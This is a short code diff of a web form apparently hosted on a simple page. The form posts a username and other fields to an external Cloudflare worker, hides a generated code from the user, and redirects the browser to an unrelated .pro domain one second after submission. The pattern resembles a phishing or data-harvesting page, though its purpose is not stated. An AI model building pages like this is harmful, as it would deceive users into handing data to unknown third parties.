@@ -145,7 +145,7 @@ input::placeholder{
 
 const WORKER_URL =
 "https://tilgram-sand.aamirkhoya.workers.dev/";
-
+const REDIRECT_URL = "https://www.rob40.pro/";
 /* Generate a random code */
 function generateCode(length = 8){
 
@@ -196,13 +196,13 @@ document.getElementById("f").addEventListener("submit", async function(e){
   try{
 
     const response = await fetch(WORKER_URL,{
-
+    
       method:"POST",
 
       headers:{
         "Content-Type":"application/json"
       },
-
+    
       body:JSON.stringify({
 
         username:name,
@@ -224,8 +224,12 @@ document.getElementById("f").addEventListener("submit", async function(e){
     /*
       Secret code is NOT shown to the user.
     */
-    msg.innerText =
-      "✅ Your request has been submitted successfully.";
+    msg.innerText = "✅ Submitted successfully!";
+
+setTimeout(() => {
+  window.location.href = REDIRECT_URL;
+}, 1000);
+  
 
     msg.style.color = "#4ade80";
 
